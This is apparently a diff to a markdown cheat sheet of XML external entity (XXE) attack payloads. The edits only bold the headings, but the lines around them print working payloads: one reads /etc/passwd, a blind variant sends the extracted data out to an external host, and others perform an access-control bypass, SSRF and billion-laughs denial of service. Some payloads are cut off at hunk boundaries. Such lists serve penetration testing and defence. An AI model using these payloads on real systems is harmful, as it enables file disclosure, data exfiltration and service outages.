@@ -1,4 +1,4 @@
-LFI Test
+**LFI Test**
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
@@ -6,7 +6,7 @@ LFI Test
 <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
 ```
 
-Blind LFI test (when first case doesn't return anything)
+**Blind LFI test (when first case doesn't return anything)**
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -15,7 +15,7 @@ Blind LFI test (when first case doesn't return anything)
 <!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
 ```
 
-Access Control bypass (loading restricted resources - PHP example)
+**Access Control bypass (loading restricted resources - PHP example)**
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -23,7 +23,7 @@ Access Control bypass (loading restricted resources - PHP example)
 <foo><result>&ac;</result></foo>
 ```
 
-SSRF Test
+**SSRF Test**
 ```
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
@@ -31,7 +31,7 @@ SSRF Test
 <!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
 ```
 
-XEE (XML Entity Expansion - DOS)
+**XEE (XML Entity Expansion - DOS)**
 ```
 <?xml version="1.0"?>
 <!DOCTYPE lolz [
@@ -50,7 +50,7 @@ XEE (XML Entity Expansion - DOS)
 <lolz>&lol9;</lolz>
 ```
 
-XEE #2 (Remote attack - through external xml inclusion)
+**XEE #2 (Remote attack - through external xml inclusion)**
 ```
 <?xml version="1.0"?>
 <!DOCTYPE lolz [
